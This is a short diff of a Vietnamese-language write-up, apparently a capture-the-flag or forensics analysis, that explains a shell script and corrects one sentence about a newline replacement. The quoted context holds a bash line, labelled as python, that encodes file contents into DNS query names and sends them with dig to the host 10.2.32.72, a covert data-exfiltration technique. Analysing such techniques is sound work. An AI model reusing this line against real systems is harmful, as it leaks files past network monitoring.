@@ -24,7 +24,7 @@ dịch đoạn code sau ta có vài điểm lưu ý:
 ```python
  else echo -ne "\n$i-.";
 ```
-Đây là thay thế xuống dòng bằng ```i-```
+Đây là thay thế xuống dòng bằng ```-.```
 
 ```python
  do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short;
